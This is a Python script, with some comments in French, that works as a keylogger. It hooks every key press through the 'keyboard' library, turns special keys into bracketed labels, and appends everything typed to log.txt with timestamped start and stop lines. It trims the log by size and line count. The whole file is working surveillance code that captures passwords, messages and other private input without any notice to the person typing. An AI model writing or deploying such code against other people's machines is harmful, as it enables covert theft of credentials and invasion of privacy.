import keyboard
import os
import datetime

# dictionary mapping keys to their string representations
KEY_MAP = {
    "space": " [SPACE] ",
    "enter": " [ENTER] ",
    "esc": " [ESC] ",
    "ctrl": " [CTRL] ",
    "alt": " [ALT] ",
    "tab": " [TAB] ",
    "maj": " [MAJ] ",
    "backspace": " [BACKSPACE] ",
    "caps lock": " [CAPS LOCK] ",
    "up": " [UP] ",
    "down": " [DOWN] ",
    "left": " [LEFT] ",
    "right": " [RIGHT] ",
    "page up": " [PAGE UP] ",
    "page down": " [PAGE DOWN] ",
    "home": " [HOME] ",
    "end": " [END] ",
    "insert": " [INSERT] ",
    "delete": " [DELETE] ",
    "f1": " [F1] ",
    "f2": " [F2] ",
    "f3": " [F3] ",
    "f4": " [F4] ",
    "f5": " [F5] ",
    "f6": " [F6] ",
    "f7": " [F7] ",
    "f8": " [F8] ",
    "f9": " [F9] ",
    "f10": " [F10] ",
    "f11": " [F11] ",
    "f12": " [F12] ",
}

# file size limit in bytes
MAX_FILE_SIZE = 6000

# number of lines to keep in file
NUM_LINES_TO_KEEP = 1000

# function to write keyboard inputs to file
# function to write keyboard inputs to file
def write_keys(keys_pressed):
    with open("log.txt", "a") as f:
        if " [ENTER] " in keys_pressed:
            f.write("\n")
        else:
            f.write("".join(keys_pressed))


# Nettoie le fichier log si il dépasse 6Ko ou qu'il dépasse 1000 lignes
def clean_file():
    with open("log.txt", "r+") as f:
        lines = f.readlines()
        if len(lines) > NUM_LINES_TO_KEEP:
            f.seek(0)
            f.writelines(lines[-NUM_LINES_TO_KEEP:])
            f.truncate()

# function called on each key press
def on_press(event):
    try:
        keys_pressed = []
        if event.name in KEY_MAP:
            keys_pressed.append(KEY_MAP[event.name])
        elif event.name.isprintable():
            keys_pressed.append(event.name)
        write_keys(keys_pressed)
        if os.path.getsize("log.txt") > MAX_FILE_SIZE:
            clean_file()
    except Exception as e:
        print(f"Error: {e}")

# function called on program exit
def on_exit():
    # write end time to file
    with open("log.txt", "a") as f:
        f.write(f"Arrêt du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")

# write start time to file
with open("log.txt", "a") as f:
    f.write(f"Lancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")

# start listening for keyboard events
keyboard.on_press(on_press)
keyboard.wait()

# program exit
on_exit()
